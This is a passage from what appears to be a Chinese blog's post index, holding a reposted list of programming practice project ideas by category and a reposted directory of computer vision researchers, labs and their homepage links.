Auror（航空）推荐：我们校长做开学推荐推荐五年了 73. 女士品茶：20世纪统计怎样变革了科学 作者 : 萨尔斯伯格 (SalsburgDavid) 出版社 : 中国统计出版社 评语 : 统计学史的入门，凌凌期推荐：没有过多专业的知识，更多的是科普介绍，统计学的哲学思想。很好的一本书，我上《概率论》时，老师推荐的。 74. 海洋科学导论 作者 : 冯士筰 等主编 出版社 : 高等教育出版社 评语 : 海洋学入门","tags":""},{"title":"程序员练手小项目","url":"/20210519/cheng-xu-yuan-lian-shou-xiao-xiang-mu/","text":"本文转载自jobbole /ProgrammingProjectList，略有删减 有了这个列表，程序员不愁没练手的小项目了 下面列出 120 多个项目构思，根据主题分成了 10 个分类。 ※文本操作 逆转字符串——输入一个字符串，将其逆转并输出。 拉丁猪文字游戏——这是一个英语语言游戏。基本规则是将一个英语单词的第一个辅音音素的字母移动到词尾并且加上后缀-ay（譬如“banana”会变成“anana-bay”）。可以在维基百科上了解更多内容。 统计元音字母——输入一个字符串，统计处其中元音字母的数量。更复杂点的话统计出每个元音字母的数量。 判断是否为回文——判断用户输入的字符串是否为回文。回文是指正反拼写形式都是一样的词，譬如“racecar”。 统计字符串中的单词数目——统计字符串中单词的数目，更复杂的话从一个文本中读出字符串并生成单词数目统计结果。 文本编辑器——记事本类型的应用，可以打开、编辑、保存文本文档。可以增加单词高亮和其它的一些特性。 RSS源创建器——可以从其它来源读取文本并将其以RSS或者Atom的格式发布出去。 实时股价——可以查询股票当前价格。用户可以设定数据刷新频率，程序会用绿色和红色的箭头表示股价走势。 访客留言簿/日志——允许人们添加评论或者日记，可以设置开启/关闭评论，并且可以记录下每一条目的时间。也可以做成喊话器。 新闻和比分播报器——一个桌面应用，可以从网上收集新闻和比赛分数，将结果在屏幕上滚动播出。 占星罗盘——用占星术来预测每天的运程。 密码短信——可以将数据加密解密，并能将其发送给朋友。 帮你挑礼物——输入一堆你可能会送的礼物，当有人过生日时，该程序会随机选择一样礼物。也可以加上一个额外功能，可以告知哪里可以弄到这个礼物。 HTML生成器——将 TEXT 文档转换成HTML文件，对制作网页HTML文档很有用。 CD-Key生成器——利用某种算法生成一个唯一的key。软件开发者可以用它来作为软件的激活器。 正则表达式查询工具——用户可以输入一段文本，在另外的控件里输入一个正则表达式。运行以后会返回匹配的内容或者正则表达式中的错误。 ※网络 FTP工具——与远程网络服务器交互文件。 原子钟校时——从网上同步原子钟时间。全世界有很多原子钟，可以把它们都列出来。 聊天应用（IRC或者MSN风格的）——像IRC那样的聊天室软件或者MSN那样的实时聊天软件。更复杂一点的话，可以为聊天制定一套你自己的传输协议。 获取当前天气——获取某个地区当前的天气情况。 P2P文件共享应用——像LimeWire、FrostWire、Bearshare或者torrent风格的应用。 端口扫描器——输入某个ip地址和端口区间，程序会逐个尝试区间内的端口，如果能成功连接的话就将该端口标记为open。 邮件检查工具（POP3/IMAP）——用户输入一些账号信息，包括服务器、ip、协议类型（POP3或者IMAP），应用每隔一段时间就会检查下该账号下的邮箱。 数据包嗅探器——侦测电脑上进出的数据包，获取诸如目的地和大小之类的信息。 IP注册地查询——输入ip地址，查询该ip是在哪注册的。 Whois查询工具——输入一个ip或者主机地址，通过whois查询并将结果返回。 邮编查询——输入邮编，返回使用该邮编的地区名称。 远程登入——远程登入桌面类型的应用，可以查看和控制远程电脑（假如你已经获得权限）。可能需要你自己的网络和两台电脑来进行测试。 网站定时检查器——每隔一段时间或者在预定的时间尝试连接某个网站或者服务器，来检查它是否可以连上，如果连不上了会通过邮件或者桌面通知来告知你。 小型网页服务器——简易版的网页服务器，可以存放包含Javascript和其它形式代码的HTML文件。复杂一点的话可以尝试流媒体视频、创建一种服务器端语言或者其它类型的流媒体。 网络蜘蛛——一个可以自动执行网页上各种任务的程序，任务包括网站检查、页面抓取、数据摘要以及网络邮务。 ※类 产品库存管理——创建一个管理产品库存的应用。建立一个产品类，包含价格、id、库存数量。然后建立一个库存类，记录各种产品并能计算库存的总价值。 电影商店——管理录像带租借，记录借出时间、到期时间、逾期费用。复杂一点可以生成逾期用户的账号报告。 航空/酒店预订系统——创建一套预订航班或酒店的预订系统。不同的航班座位和酒店房间收费不一样。譬如头等舱要比经济舱贵。带阁楼的套间要更贵些。记录下何时有空房可供预订。 学生成绩管理器——记录一个班级的学生（创建一个Student类，记录他们的名字、平均分和考试分数）和他们的成绩等级。根据学生的测验和作业的分数计算出平均分和成绩等级。复杂一点可以将数据画在贝尔曲线上。 银行账户管家——创建一个名为“Account”的抽象类，有三个为“CheckingAccount”、“SavingsAccount”和“BusinessAccount”的子类。通过类似ATM的程序来管理这些账户的借贷。 馆藏目录——创建一个图书类，记录书名、页数、国际标准书号、是否借出。用它来管理各种书籍，允许用户进行借出和归还操作。复杂一点的话，可以生成逾期图书和逾期费用的报告。也可以让用户进行预约操作。 ※线程处理 下载进度条——创建一个表示下载进度的进度条。进度条由独立的线程操作，通过委托来和主线程进行通讯。 下载管理器——允许程序同时下载数个文件，每个都用单独的线程进行背景下载。主线程会关注下载进度并且在下载完成时通知用户。 聊天软件（远程聊天）——做一个聊天软件，允许你通过ip直接连接到另一台电脑，也允许你的“服务器”程序处理多个请求连接。 批量缩略图生成器——在进行图片转换的处理时会需要很多时间，尤其是图片很大时。做一个图片处理程序，能让你在做其它事的时候在后台线程里将数百张图片转换成某个大小的图片。复杂一点的话可以用一个线程来缩放，用另一个线程来为缩略图重命名。 ※Web应用 所见即所得编辑器——创建一个在线编辑器，允许用户移动元素、创建表格、书写文本、设置颜色，而用户不必懂HTML。就像Dreamweaver或者FrontPage。如果需要例子的话，可以参看DIC。 分页浏览器——创建一个可以分页的小型网页浏览器，可以同时浏览几个网页。简化一点的话不要考虑Javascript或者其它客户端代码。 文件下载器——该程序可以从网页上下载各种资源，包括视频和其它文件。用于有很多下载链接的网页。 远程登录——创建一个远程登录的应用，可以通过网络登录服务器并能执行一些基本命令。 在线白板——做一个在线白板程序，你和朋友们可以一起在白板上进行一些操作，画图、写字等等。 带宽监视器——这个小工具可以记录你已经在网上上传和下载多少数据流量了。可以试着做份报告或者图表来展示各时段的使用情况。 书签搜集管理器——该程序可以让用户上传书签并将它们排序，去掉重复的，并能生成书签文件以供Firefox/IE/Safari等使用。复杂一点的话可以试着将书签整理进不同的文件夹。 密码保险箱——用来记录各种密码，并且将它们加密，这样别人就看不到了。 iGoogle媒体播放器小部件——做一个iGoogle小部件，可以用来播放本地音乐列表，也可以每天分享一首歌。也许还可以让别人看到你最近听了些什么歌。 基于文本的游戏——做一个像Utopia那样的文本RPG，游戏中，你可以创建一个文明、收集资源、共铸联盟、施放法术、回合制系统。看看是否能够统一王国。 定时自动登录——做一个程序可以在预定的时间登录进某个指定的网页并且执行特定的动作，然后在登出。可以用来检查邮箱、发布常规内容、为其它程序获取信息。 电子卡片生成器——可以让用户制作自己的电子卡片并发送给其他人。可以使用flash也可以不用。可以使用图片库，也可以加上深刻的格言警句。 内容管理系统——像Joomala、Drupal、PHP Nuke这样的内容管理系统。从简单的做起，慢慢增加其它功能。 模板制作器——该网站应用允许用户输入各种颜色代码、元素、尺寸，来为PHPBB、Invision Board、MySpace之类的应用创建模板文件。 验证码生成器——应该在登录时见过有数字有字母的验证码图片吧？这可以防止自动登录和垃圾广告。试着自己做一个，如果使用PHP的话，看下GD的图片函数。 ※文件 试卷生成器——该程序可以从文件中随机挑选出不同的题目生成一份试卷。每份试卷可以不一样，通过读取答案来给打分。 快速启动——该工具可以添加各个程序的小图标，点击小图标就可以运行程序。和Windows的快速启动类似。 文件管理器——做一个文件管理器，要加些新特性，更佳的搜索功能、新图标、新外观。 文件记录排序工具——从文件中读取记录，将其排序并写回文件中。允许用户选择排序风格以及排序关键字。 生成财务交易文件并且算出平均值——将财务交易读进文件，按照账户分类、算出各项目的总量或平均值、理清各账户的借贷数据。 Zip文件生成器——用户输入不同文件夹的文件，也许还包括其他电脑中的文件，然后程序将这些文件打包成zip文件。复杂一点的话，打包时对这些文件进行压缩。 PDF生成器——从txt、html或其它文件中读取数据生成PDF文件。可以做成一个网页服务，用户上传文件，返回一个pdf版本。 批量文件命名器——程序批量处理一些文件，将根据用户提供的过滤器为它们重命名。譬如用户输入的过滤器为myimage###.jpg，那么会生成至少包含3位数的文件名，譬如myimage001.jpg、myimage145.jpg，甚至是myimage1987.jpg，因为1987也满足了至少包含3位数的条件。 MP3标签生成器——修改MP3文件的id3v1标签。还可以试着在MP3文件的头部加入id3v2的标签，譬如album art标签。 日志文件生成器——该程序可以记录指定事件的日志。譬如程序做了什么、系统在干什么、文件什么时候被修改了。 Excel分页输出器——做一个在线程序，可以读取文件内容生成一个excel分页。可以通过CVS或者其它文件格式来做。复杂一点的话看看是否能创建公式字段。 RPG角色属性生成器——做一个程序来给RPG角色随机分配属性点数，可以由用户制定一些分配规则。可以生成职业、性别、力量/魔法/敏捷点数、额外能力或者贸易技能。把结果保存成文件，这样跑团的时候地下城主可以把它打印出来。 文件复制工具——该工具可以批量处理文件复制和备份操作。 ※数据库 SQL查询分析器——该工具可以让用户输入一条查询命令，让其运行于本地数据库中。尽量让它运行得更高效。 远程SQL工具——该工具能让你通过网络在远程服务器上执行查询操作。它能接收远程主机地址、验证用户名和密码、执行查询并返回结果。 卡片整理器——创建一个在线应用，用来记录搜集到的卡片。可以让用户输入整套卡片，查看哪些已经有了，哪些还需要搜集。要增加复杂度的话，还可以让用户知道还差多少可以完成，或者已经收集卡片的价值。 报告生成器——该工具可以根据数据库中的表格生成一份报告。譬如根据订单表格生成销售报告。 数据库备份脚本制作器——该程序可以读取数据库的对象、关系、记录和步骤，生成一个sql文件，该文件可以导入另一个数据库或者作为备份文件。 备忘录——该程序可以让用户设置一个日期和某个事件的时间、事件备注并将它们放到日历上。用户可以查看日历、搜索特定的事件。复杂一点的话，可以让用户设置重复发生的事件，譬如每天、每周、每月、每年等等。 预算记录器——该程序可以记录家庭预算。用户可以添加支出、收入，计算一段时间内的收入和支出。复杂一点的话，让用户指定一个时间段，显示该时间段内的家庭收支情况。 电话簿——记录各种联系人和他们的号码、邮箱、备注。复杂一点的话可以让用户连上网将电话簿发布到设置好的网站上。 电视节目记录器——你是否有不想错过的电视节目？但没有录像机或者想之后能找到该电视节目然后录下来，那么可以做个程序寻找各种在线电视导航网站，记录下电视节目名称、播放时间、播放频道，存在数据库中。数据库或者网站到时就会发邮件提醒你，节目就快在某个频道开始了。 旅行计划系统——该系统可以让用户管理旅行路线，记录下航班和酒店安排、感兴趣的地方、预算和时间表。 实体关系图生成器——该程序可以让用户整合实体关系图，并将其保存起来，也可以用它来生成一些基础SQL语句。 数据库翻译器（MySQL &lt; -&gt;SQL Server）——该工具可以从数据库A读取数据，生成数据库B使用的SQL语句，将数据存入数据库B。比较常用的是SQL Server和Oracle使用的MySQL服务器。 BBS论坛——为你和小伙伴们做一个论坛，可以发帖、管理、分享想法和构思。 ※图像和多媒体 幻灯片——做一个以幻灯片形式显示各种图片的程序。为了增加难度可以做些额外的效果，譬如渐进检出、星型擦除、窗口渐隐。 思维导图——允许用户记录下各种构思并且快速地进行头脑风暴将这些构思整合到一张思维导图中。越快越好，因此要让用户能迅速地写下构思，然后将其拖到可视的导图中去，将构思之间的关系展现出来。 导入图片并存成灰度图——该工具将图片上的彩色除尽并保存。可以增加对比度调整、色化等额外功能以增加复杂度。 在线流媒体视频——试着自己做一个在线流媒体视频播放器。 MP3播放器（以及其他格式的音乐播放器）——该小程序用来播放你最爱的音乐文件。复杂一点的话看看能否加个播放列表功能和均衡器。 批量图片处理——该程序可以将一个文件夹内的图片进行统一的处理，譬如降低图片色调、转换格式或者修改文件属性。还可以尝试给图片增加标签。 CD烧录器——可以轻松烧录CD的工具。 YouTube下载器——可以从Youtube.com上下载视频到硬盘中，要支持包括FLV和AVI在内的文件格式。 墙纸管理工具——做一个管理墙纸的程序，可以定时更换刷新墙纸，也可以针对分辨率进行缩放。 截屏程序——做一个可以截屏的工具，复杂一点可以增加一个转发邮件的功能。 图片浏览器——该程序可以查看电脑上各种格式的图片，譬如PNG、GIF、JPG、BMP、TIFF等等。 交通信号灯——试着做一个交通信号灯并且把它放到可以互动的场景中。不要让汽车闯红灯或者撞到其它车。 MP3-WAV转换器——MP3格式本质上就是压缩版的WAV。试着将MP3转换成WAV格式以供可以处理WAV格式的程序使用。请记住1MB的MP3大约等于10MB的WAV。 签名生成器——是否在网上见过有人的留言后面有条生成的签名？试着做个程序让用户可以指定背景、文字、颜色和对齐方式来定制一个签名档。 屏保——电脑空闲时会运行的屏保程序。简单版的可以使用一些标准图片，复杂版的可以做出能在屏幕上转来转去的3D物体。 水印——你是否想保护你图片的版权？在图片上加上标志或者文字，这样别人就不能轻易地从你网站上盗图了。做一个程序来给你的图片加上水印吧。 海龟图——创建一个20*20的格子，用命令让一只海龟在格子上画线。可以前进、左转、右转，拿起或放下笔等等。复杂一点的话，允许程序从文件中读取命令列表。可以在网上了解到更多关于“海龟图”的信息。 ※游戏 战船——创建两块游戏面板，玩家各占一边，在上面放置一些战船，玩家看不到对方的面板。每艘船都占几个格子，玩家轮流攻击某个格子，如果格子上有船，那就命中目标，否则就是未命中。当一艘船所占的所有格子都被攻击命中了，那么船就被击沉。谁先将对方战船全部击沉就获胜。 象棋跳棋——象棋或者跳棋游戏。可以试着做成可以联网玩，用图形用户界面来实现悔棋、保存走棋过程并且可以回放。 刽子手——从文件中随机选择一个单词，让玩家猜单词中的字母。旁边是一幅隐藏的行绞刑的画，猜错一个单词，画就显示出一部分。画全部显示出来时还没能猜全的话玩家就输了。 填字游戏——创建一个填字游戏，并为每个词提供一个提示信息，让玩家填上所有正确的单词。 青蛙跳——让青蛙跳过河或者马路，过河的话要跳在顺流而下速度各异的木头或者睡莲叶子上，过马路的话要避开速度各异的车子。","tags":"code"},{"title":"计算机视觉牛人博客和代码汇总","url":"/20210506/ji-suan-ji-shi-jue-niu-ren-bo-ke-he-dai-ma-hui-zong/","text":"转载自 https://www.cnblogs.com/findumars/p/5009003.html 略有删改，未经修正 1 牛人Homepages（随意排序，不分先后）： 1.USC Computer Vision Group：南加大，多目标跟踪/检测等； 2.ETHZ Computer Vision Laboratory：苏黎世联邦理工学院，欧洲最好的几个CV/ML研究机构； 3.Helmut Grabner：Online Boosting and Vision的作者，tracking by online feature selection的早期经典，貌似现在不是很活跃了，跑去创业了； 4.Robert T. Collins：PSU，也是跟踪界的大牛； 5.Ying Wu：美国西北大学，华人学者中的翘楚； 6.Junsong Yuan：NTU，上面Wu老师的学生； 7.James W. Davis：俄亥俄州立，视频监控； 8.&nbsp;The Australian Centre for Visual Technologies：阿德莱德大学的CV组，最近也是exceedingly active &amp; fruitful； 9.Chunhua Shen：属上面的ACVT组，最近非常活跃； 10.Xi Li：同属ACVT，之前是中科院的PHD，跟踪方面的论文很多，有理论深度； 11.Haibin Ling：天普大学，L1-Tracker及后续扩展，源码分享； 12.Learning, Recognition, and Surveillance：奥地利 TU Graz，在线学习，跟踪/检测等，active！源码分享； 13.Statistical Visual Computing Laboratory：UCSD，光听名字就很学术吧，Saliency研究很有名； 14.David Ross：多伦多大学，IVT的作者，跟踪中Generative表观的经典中的经典，提供源码，IVT的代码结构被后来很多人引用，值得一读； 15.EPFL, Computer Vision Laboratory：洛桑理工的学院，和上面的的ETHZ CV lab同样是欧洲最好的CV研究大组； 16.Jamie Shotton：属微软剑桥研究中心，Decision/Regression Forests； 17.Sinisa Todorovic：俄勒冈州立，行为分析等； 18.Shi Jianbo：大名鼎鼎的Good Feature to Track作者，目前方向行为分析和多目标跟踪等； 19.Shai Avidan：特拉维夫大学，大牛级，可算是Tracking-by-detection的开创者，Ensemble Tracking, SVM Tracking； 20.Visual Information Processing and Learning：中科院计算所，山世光老师的研究组，不需介绍了吧； 21.Shaogang Gong：Queen Mary University of London，各种PAMI，IJCV； 22.Yang Jian：南京理工大学，2DPCA，人脸识别； 23.CALVIN：weakly supervised learning，objectness； 24.Learning &amp; Vision Group：NUS，稀疏表示； 26.Xiaogang Wang：CUHK，active &amp; fruitful，行人检测，群体行为分析； 27.Zhou, Bolei：上面Wang老师硕士研究生，群体行为，看看人家的Publications已经轻松甩国内博士好几条街； 28.Computational Vision Group：Leader--Deva Ramanan； 29.Zhang Lei：香港理工，稀疏表示，人脸识别，可以算大中华区比较活跃的研究组了，几乎每篇论文都有对应源码； 30.Zhang Kaihua：上面Zhang老师学生，Compressive Tracking； 31.Pramod Sharma：离线训练检测器的在线自适应，貌似是个不错的topic； 32.Loris Bazzani：person re-id，他的SDALF(code)描述子经常被用来做为比较对象，说明还是有参考价值的； 33.Pedro Felzenszwalb：布朗大学，目标检测，新新N人一枚； 34.Vijayakumar Bhagavatula：IEEE&nbsp;Fellow，&nbsp;correlation&nbsp;filters； 35.Laurens van der Maaten：MLer. &nbsp; &nbsp; &nbsp; 牛人主页（主页有很多论文代码） Serge Belongie&nbsp;at UC San Diego Antonio Torralba&nbsp;at MIT Alexei Ffros&nbsp;at CMU Ce Liu&nbsp;at Microsoft Research New England Vittorio Ferrari&nbsp;at Univ.of&nbsp;Edinburgh Kristen Grauman&nbsp;at UT Austin Devi Parikh&nbsp;at&nbsp;&nbsp;TTI-Chicago&nbsp;(Marr Prize at ICCV2011) John Wright&nbsp;at Columbia Univ. Piotr Dollar&nbsp;at CalTech Boris Babenko&nbsp;at UC San Diego David Ross&nbsp;at Google/Youtube David Donoho&nbsp;at Stanford Univ. &nbsp; &nbsp; 大神们： &nbsp; William T. Freeman&nbsp;at MIT Roberto Cipolla&nbsp;at Cambridge David Lowe&nbsp;at Univ. of British Columbia Mubarak Shah&nbsp;at Univ. of Central Florida Yi Ma&nbsp;at MSRA Tinne Tuytelaars&nbsp;at K.U. Leuven Trevor Darrell&nbsp;at U.C. Berkeley Michael J. Black&nbsp;at Brown Univ. &nbsp; &nbsp; &nbsp; &nbsp; 重要研究组： &nbsp; Computer Vision Group&nbsp;at UC Berkeley Robotics Research Group&nbsp;at Univ. of Oxford LEAR&nbsp;at INRIA Computer Vision Lab&nbsp;at Stanford Computer Vision Lab&nbsp;at EPFL Computer Vision Lab&nbsp;at ETH Zurich Computer Vision Lab&nbsp;at Seoul National Univ. Computer Vision Lab&nbsp;at UC San Diego Computer Vision Lab&nbsp;at UC Santa Cruz Computer Vision Lab&nbsp;at Univ. of Southern California Computer Vision Lab&nbsp;at Univ. of Central Florida Computer Vision Lab&nbsp;at Columbia Univ. UCLA Vision Lab Motion and Shape Computing Group&nbsp;at George Mason Univ. Robust Image Understanding Lab&nbsp;at Rutgers Univ. Intelligent Vision Systems Group&nbsp;at Univ. of Bonn Institute for Computer Graphics and Vision&nbsp;at Graz Univ. of Tech. Computer Vision Lab.&nbsp;at Vienna Univ. of Tech.&nbsp; Computational Image Analysis and Radiology&nbsp;at Medical Univ. of Vienna Personal&nbsp;Robotics&nbsp;Lab&nbsp;at CMU Visual Perception Lab&nbsp;at Purdue Univ. &nbsp; &nbsp; 潜力牛人： &nbsp; Juergen Gall&nbsp;at&nbsp;ETH Zurich Matt Flagg&nbsp;at Georgia Tech. Mathieu Salzmann&nbsp;at TTI-Chicago Gerg Shakhnarovich&nbsp;at TTI-Chicago Taeg Sang Cho&nbsp;at MIT Jianchao Yang&nbsp;at UIUC Stefan Roth&nbsp;at TU Darmstadt Peter Kontschieder&nbsp;at Graz Univ. of Tech. Dominik Alexander Klein&nbsp;at Univ. of Bonn Yinan Yu&nbsp;at CASIA (PASCAL VOC 2010 Detection Challenge Winner) Zdenek Kalal&nbsp;at FPFL Julien Pilet&nbsp;at FPFL Kenji Okuma &nbsp; 2 个人、研究机构链接 （1）googleResearch；&nbsp;http://research.google.com/index.html（2）MIT博士，汤晓欧学生林达华；http://people.csail.mit.edu/dhlin/index.html（3）MIT博士后Douglas Lanman；&nbsp;http://web.media.mit.edu/~dlanman/（4）opencv中文网站；http://www.opencv.org.cn/index.php/%E9%A6%96%E9%A1%B5（5）Stanford大学vision实验室；&nbsp;http://vision.stanford.edu/research.html（6）Stanford大学博士崔靖宇；&nbsp;http://www.stanford.edu/~jycui/（7）UCLA教授朱松纯；&nbsp;http://www.stat.ucla.edu/~sczhu/（8）中国人工智能网；&nbsp;http://www.chinaai.org/（9）中国视觉网；&nbsp;http://www.china-vision.net/（10）中科院自动化所；&nbsp;http://www.ia.cas.cn/（11）中科院自动化所李子青研究员；&nbsp;http://www.cbsr.ia.ac.cn/users/szli/（12）中科院计算所山世光研究员；&nbsp;http://www.jdl.ac.cn/user/sgshan/（13）人脸识别主页；&nbsp;http://www.face-rec.org/（14）加州大学伯克利分校CV小组；http://www.eecs.berkeley.edu/Research/Projects/CS/vision/ （15）南加州大学CV实验室；&nbsp;http://iris.usc.edu/USC-Computer-Vision.html（16）卡内基梅隆大学CV主页； http://www.cs.cmu.edu/afs/cs/project/cil/ftp/html/vision.html （17）微软CV研究员Richard Szeliski；http://research.microsoft.com/en-us/um/people/szeliski/（18）微软亚洲研究院计算机视觉研究组；&nbsp;http://research.microsoft.com/en-us/groups/vc/（19）微软剑桥研究院ML与CV研究组；&nbsp;http://research.microsoft.com/en-us/groups/mlp/default.aspx （20）研学论坛；&nbsp;http://bbs.matwav.com/（21）美国Rutgers大学助理教授刘青山；http://www.research.rutgers.edu/~qsliu/（22）计算机视觉最新资讯网；&nbsp;http://www.cvchina.info/（23）运动检测、阴影、跟踪的测试视频下载；http://apps.hi.baidu.com/share/detail/18903287（24）香港中文大学助理教授王晓刚；&nbsp;http://www.ee.cuhk.edu.hk/~xgwang/(25)香港中文大学多媒体实验室（汤晓鸥）;&nbsp;http://mmlab.ie.cuhk.edu.hk/(26)U.C. San Diego. computer vision;http://vision.ucsd.edu/content/home(27)CVonline;&nbsp;http://homepages.inf.ed.ac.uk/rbf/CVonline/(28)computer vision software;&nbsp;http://peipa.essex.ac.uk/info/software.html(29)Computer Vision Resource;&nbsp;http://www.cvpapers.com/(30)computer vision research groups;http://peipa.essex.ac.uk/info/groups.html(31)computer vision center;&nbsp;http://computervisioncentral.com/cvcnews (32)浙江大学图像技术研究与应用（ITRA）团队：http://www.dvzju.com/ (33)自动识别网：http://www.autoid-china.com.cn/ (34)清华大学章毓晋教授：http://www.tsinghua.edu.cn/publish/ee/4157/2010/20101217173552339241557/20101217173552339241557_.html (35)顶级民用机器人研究小组Porf.Gary领导的Willow Garage:http://www.willowgarage.com/ (36)上海交通大学图像处理与模式识别研究所：http://www.pami.sjtu.edu.cn/ (37)上海交通大学计算机视觉实验室刘允才教授：http://www.visionlab.sjtu.edu.cn/ (38)德克萨斯州大学奥斯汀分校助理教授Kristen Grauman ：http://www.cs.utexas.edu/~grauman/&nbsp;图像分解，检索 (39)清华大学电子工程系智能图文信息处理实验室（丁晓青教授）：http://ocrserv.ee.tsinghua.edu.cn/auto/index.asp (40)北京大学高文教授：http://www.jdl.ac.cn/htm-gaowen/ (41)清华大学艾海舟教授：http://media.cs.tsinghua.edu.cn/cn/aihz (42)中科院生物识别与安全技术研究中心：http://www.cbsr.ia.ac.cn/china/index%20CH.asp (43)瑞士巴塞尔大学 Thomas Vetter教授：http://informatik.unibas.ch/personen/vetter_t.html (44)俄勒冈州立大学 Rob Hess博士：http://blogs.oregonstate.edu/hess/ (45)深圳大学 于仕祺副教授：http://yushiqi.cn/ (46)西安交通大学人工智能与机器人研究所：http://www.aiar.xjtu.edu.cn/ (47)卡内基梅隆大学研究员Robert T. Collins:http://www.cs.cmu.edu/~rcollins/home.html#Background (48)MIT博士Chris Stauffer:http://people.csail.mit.edu/stauffer/Home/index.php (49)美国密歇根州立大学生物识别研究组(Anil K. Jain教授)：http://www.cse.msu.edu/rgroups/biometrics/ (50)美国伊利诺伊州立大学Thomas S. Huang:http://www.beckman.illinois.edu/directory/t-huang1 (51)武汉大学数字摄影测量与计算机视觉研究中心：http://www.whudpcv.cn/index.asp (52)瑞士巴塞尔大学Sami Romdhani助理研究员：http://informatik.unibas.ch/personen/romdhani_sami/ (53)CMU大学研究员Yang Wang:http://www.cs.cmu.edu/~wangy/home.html (54)英国曼彻斯特大学Tim Cootes教授：http://personalpages.manchester.ac.uk/staff/timothy.f.cootes/ (55)美国罗彻斯特大学教授Jiebo Luo:http://www.cs.rochester.edu/u/jluo/ (56)美国普渡大学机器人视觉实验室：https://engineering.purdue.edu/RVL/Welcome.html (57)美国宾利州立大学感知、运动与认识实验室：http://vision.cse.psu.edu/home/home.shtml (58)美国宾夕法尼亚大学GRASP实验室：https://www.grasp.upenn.edu/ (59)美国内达华大学里诺校区CV实验室：http://www.cse.unr.edu/CVL/index.php (60)美国密西根大学vision实验室：http://www.eecs.umich.edu/vision/index.html (61)University of Massachusetts(麻省大学),视觉实验室：http://vis-www.cs.umass.edu/index.html (62)华盛顿大学博士后Iva Kemelmacher:http://www.cs.washington.edu/homes/kemelmi (63)以色列魏茨曼科技大学Ronen Basri:http://www.wisdom.weizmann.ac.il/~ronen/index.html (64)瑞士ETH-Zurich大学CV实验室：http://www.vision.ee.ethz.ch/boostingTrackers/index.htm (65)微软CV研究员张正友：http://research.microsoft.com/en-us/um/people/zhang/ (66)中科院自动化所医学影像研究室：http://www.3dmed.net/ (67)中科院田捷研究员：http://www.3dmed.net/tian/ (68)微软Redmond研究院研究员Simon Baker:http://research.microsoft.com/en-us/people/sbaker/ (69)普林斯顿大学教授李凯：http://www.cs.princeton.edu/~li/(70)普林斯顿大学博士贾登：http://www.cs.princeton.edu/~jiadeng/(71)牛津大学教授Andrew Zisserman：&nbsp;http://www.robots.ox.ac.uk/~az/(72)英国leeds大学研究员Mark Everingham:http://www.comp.leeds.ac.uk/me/(73)英国爱丁堡大学教授Chris William:&nbsp;http://homepages.inf.ed.ac.uk/ckiw/(74)微软剑桥研究院研究员John Winn:&nbsp;http://johnwinn.org/(75)佐治亚理工学院教授Monson H.Hayes：http://savannah.gatech.edu/people/mhayes/index.html(76)微软亚洲研究院研究员孙剑：http://research.microsoft.com/en-us/people/jiansun/(77)微软亚洲研究院研究员马毅：http://research.microsoft.com/en-us/people/mayi/(78)英国哥伦比亚大学教授David Lowe:&nbsp;http://www.cs.ubc.ca/~lowe/(79)英国爱丁堡大学教授Bob Fisher:&nbsp;http://homepages.inf.ed.ac.uk/rbf/(80)加州大学圣地亚哥分校教授Serge J.Belongie:http://cseweb.ucsd.edu/~sjb/(81)威斯康星大学教授Charles R.Dyer:&nbsp;http://pages.cs.wisc.edu/~dyer/(82)多伦多大学教授Allan.Jepson:&nbsp;http://www.cs.toronto.edu/~jepson/(83)伦斯勒理工学院教授Qiang Ji:&nbsp;http://www.ecse.rpi.edu/~qji/(84)CMU研究员Daniel Huber:&nbsp;http://www.ri.cmu.edu/person.html?person_id=123(85)多伦多大学教授：David J.Fleet:&nbsp;http://www.cs.toronto.edu/~fleet/(86)伦敦大学玛丽女王学院教授Andrea Cavallaro:http://www.eecs.qmul.ac.uk/~andrea/(87)多伦多大学教授Kyros Kutulakos:&nbsp;http://www.cs.toronto.edu/~kyros/(88)杜克大学教授Carlo Tomasi:&nbsp;http://www.cs.duke.edu/~tomasi/(89)CMU教授Martial Hebert:&nbsp;http://www.cs.cmu.edu/~hebert/(90)MIT助理教授Antonio Torralba:&nbsp;http://web.mit.edu/torralba/www/(91)马里兰大学研究员Yasel Yacoob:&nbsp;http://www.umiacs.umd.edu/users/yaser/(92)康奈尔大学教授Ramin Zabih:&nbsp;http://www.cs.cornell.edu/~rdz/ (93)CMU博士田渊栋: http://www.cs.cmu.edu/~yuandong/(94)CMU副教授Srinivasa Narasimhan: http://www.cs.cmu.edu/~srinivas/(95)CMU大学ILIM实验室：http://www.cs.cmu.edu/~ILIM/(96)哥伦比亚大学教授Sheer K.Nayar: http://www.cs.columbia.edu/~nayar/(97)三菱电子研究院研究员Fatih Porikli ：http://www.porikli.com/(98)康奈尔大学教授Daniel Huttenlocher：http://www.cs.cornell.edu/~dph/(99)南京大学教授周志华：http://cs.nju.edu.cn/zhouzh/index.htm(100)芝加哥丰田技术研究所助理教授Devi Parikh: http://ttic.uchicago.edu/~dparikh/index.html(101)瑞士联邦理工学院博士后Helmut Grabner:http://www.vision.ee.ethz.ch/~hegrabne/#Short_CV (102)香港中文大学教授贾佳亚：http://www.cse.cuhk.edu.hk/~leojia/index.html (103)南京大学教授吴建鑫：http://c2inet.sce.ntu.edu.sg/Jianxin/index.html (104)GE研究院研究员李关：http://www.cs.unc.edu/~lguan/ (105)佐治亚理工学院教授Monson Hayes:http://savannah.gatech.edu/people/mhayes/ (106)图片检索国际竞赛PASCAL VOC(微软剑桥研究院组织):http://pascallin.ecs.soton.ac.uk/challenges/VOC/ (107)机器视觉开源处理库汇总：http://archive.cnblogs.com/a/2217609/ (108)布朗大学教授Benjamin Kimia:&nbsp;http://www.lems.brown.edu/kimia.html&nbsp; (109)数据堂-图像处理相关的样本数据：http://www.datatang.com/data/list/602026/p1 (110)东软基于CV的汽车辅助驾驶系统：http://www.neusoft.com/cn/solutions/1047/ (111)马里兰大学教授Rema Chellappa:http://www.cfar.umd.edu/~rama/ (112)芝加哥丰田研究中心助理教授Devi Parikh：http://ttic.uchicago.edu/~dparikh/index.html (113)宾夕法尼亚大学助理教授石建波：http://www.cis.upenn.edu/~jshi/ (114)比利时鲁汶大学教授Luc Van Gool：http://www.vision.ee.ethz.ch/members/get_member.cgi?id=1,&nbsp;http://www.vision.ee.ethz.ch/~vangool/ (115)行人检测主页：http://www.pedestrian-detection.com/ (116)法国学习算法与系统实验室Basilio Noris博士：http://lasa.epfl.ch/people/member.php?SCIPER=129576&nbsp;http://mldemos.epfl.ch/ (117)美国马里兰大学LARRY S.DAVIS教授：http://www.umiacs.umd.edu/~lsd/ (118)计算机视觉论文分类导航：http://www.visionbib.com/bibliography/contents.html 